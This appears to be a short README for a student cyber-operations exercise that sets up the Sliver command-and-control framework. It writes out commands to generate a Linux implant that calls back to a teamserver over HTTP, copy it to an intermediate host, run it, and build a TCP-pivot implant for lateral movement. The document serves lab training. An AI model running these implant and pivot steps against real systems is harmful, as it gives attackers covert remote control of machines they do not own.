# Cyber Ops Unit Sliver Setup
All the commands and files needed to set up the exercise, reminder that this exercise will **not** work over the TAMU network (because we can't port forward without access to the routers) and will have to be done over hotspot, where everyone will (probably) be on the same subnet, meaning they can directly SSH to the first machine

Make sure to run `sudo systemctl start sliver.service` to get Sliver working

Commands used:
Generate Sliver Implant: `generate --os linux --arch arm64 --name [Implant Name] --http [IP of Teamserver]`
Copy over to Intermediate server: `scp [Implant Name] Intermediate@[IP of Intermediate Server]:/home/Intermediate/Documents`
Run Implant: `./[Implant Name] &`
View sessions: `sessions`
Use the Implant: `use [session number]`
Create a pivot through that implant: 
Generate an implant for that pivot: `generate --os linux --arch arm64 --tcp-pivot [IP Address of Intermediate Server:[Pivot Port]`
